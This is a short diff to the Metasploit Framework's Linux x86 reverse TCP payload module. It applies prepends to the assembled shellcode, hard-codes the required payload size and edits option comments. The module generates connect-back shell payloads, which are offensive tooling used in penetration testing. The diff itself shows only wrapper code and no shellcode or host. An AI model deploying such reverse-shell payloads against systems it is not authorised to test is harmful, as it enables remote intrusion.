@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/transport_config'
+require 'msf/core/payload/linux'
 
 module Msf
 
@@ -51,7 +52,8 @@ module Payload::Linux::ReverseTcp
   #
   def generate_reverse_tcp(opts={})
     asm = asm_reverse_tcp(opts)
-    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+    buf = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+    apply_prepends(buf)
   end
 
   #
@@ -59,7 +61,7 @@ module Payload::Linux::ReverseTcp
   #
   def required_space
     # Start with our cached default generated size
-    space = cached_size
+    space = 300
 
     # Reliability adds 10 bytes for recv error checks
     space += 10
@@ -72,11 +74,10 @@ module Payload::Linux::ReverseTcp
   # Generate an assembly stub with the configured feature set and options.
   #
   # @option opts [Fixnum] :port The port to connect to
-  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
+  # @option opts [String] :host The host IP to connect to
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
   def asm_reverse_tcp(opts={})
-
     # TODO: reliability is coming
     #retry_count  = [opts[:retry_count].to_i, 1].max
     #reliable     = opts[:reliable]
@@ -128,7 +129,4 @@ module Payload::Linux::ReverseTcp
 end
 
 end
-
-
-
 
